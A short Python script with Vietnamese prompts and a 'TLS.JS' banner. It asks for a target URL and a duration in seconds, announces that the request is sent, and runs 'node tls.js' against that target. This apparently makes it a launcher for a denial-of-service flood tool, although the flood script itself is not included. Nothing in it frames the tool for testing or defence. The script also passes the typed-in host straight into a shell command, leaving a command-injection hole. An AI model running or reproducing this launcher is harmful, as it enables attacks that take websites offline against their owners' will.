import os
os.system("cls" if os.name == "nt" else "clear")
a='''
	88888888888 888      .d8888b.     888888  .d8888b.  
	    888     888     d88P  Y88b      "88b d88P  Y88b 
	    888     888     Y88b.            888 Y88b.      
	    888     888      "Y888b.         888  "Y888b.   
	    888     888         "Y88b.       888     "Y88b. 
	    888     888           "888       888       "888 
	    888     888     Y88b  d88P d8b   88P Y88b  d88P 
	    888     88888888 "Y8888P"  Y8P   888  "Y8888P"  
	                                   .d88P            
	                Đậu Đậu          .d88P"             
	                                888P"                                                                                 
	'''
print(a)
host=input("  [+] Nhập URL Taget: ")
time=int(input("  [+] Nhập Time (s): "))
print("====================================")
print("  Đã gửi yêu cầu\n")
os.system(f"node tls.js {host} {time}")
